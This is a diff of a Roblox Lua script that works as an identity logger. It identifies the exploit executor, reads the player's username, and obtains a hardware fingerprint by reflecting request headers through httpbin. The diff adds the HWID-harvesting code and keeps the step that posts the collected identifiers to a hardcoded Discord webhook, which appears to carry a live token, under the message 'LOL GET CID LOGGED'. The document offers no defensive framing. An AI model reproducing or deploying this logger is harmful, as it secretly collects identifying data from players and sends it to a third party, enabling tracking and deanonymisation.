@@ -1,7 +1,5 @@
 local ek = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit";
 local ge = game;
-local re = ge:GetService("RbxAnalyticsService");
-local cd = re:GetClientId();
 local ps = ge:GetService("Players");
 local lr = ps.LocalPlayer;
 local le = lr.Name;
@@ -10,12 +8,35 @@ local url1 = "https://discord.com/api/webhooks/";
 local url2 = "968304971466547220/";
 local url3 = "CDj9swdNxS3g4bIiAXuWU-lL8Xz5qMkHeYegdCLD3t1sEaddn4Y1dXz91pb7LZsmZyvI";
 local cg = url1..url2..url3
+local http_request = http_request or request or HttpPost or syn.request or http.request;
+local body = http_request({
+    Url = 'https://httpbin.org/post';
+    Method = 'POST'
+}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body);
+local hwid_list = {
+    'fingerprint', 
+    'Krnl-Hwid', 
+    'shadow_hardware', 
+    'Syn-Fingerprint', 
+    'Exploit-Guid', 
+    'Proto-User-Identifier', 
+    'Sentinel-Fingerprint', 
+    'Fingerprint', 
+    'Trigon-Fingerprint'
+};
+local hwid;
+for i, v in next, hwid_list do
+    if decoded.headers[v] then
+        hwid = decoded.headers[v]
+    end
+end
 local da = {
     ["content"] = "LOL GET CID LOGGED",
     ["embeds"] = {
         {
             ["title"] = "**Username: " .. le.." **",
-            ["description"] = "ClientId: " .. cd.." with **"..ek.."**",
+            ["description"] = "ClientId: " .. hwid.." with **"..ek.."**",
             ["type"] = "rich",
             ["color"] = tonumber(0x7269da),
             ["image"] = {
@@ -39,5 +60,4 @@ local pt = {
     Method = md,
     Headers = hs
 };
-local r = http_request or request or HttpPost or syn.request;
-r(pt)
+http_request(pt)
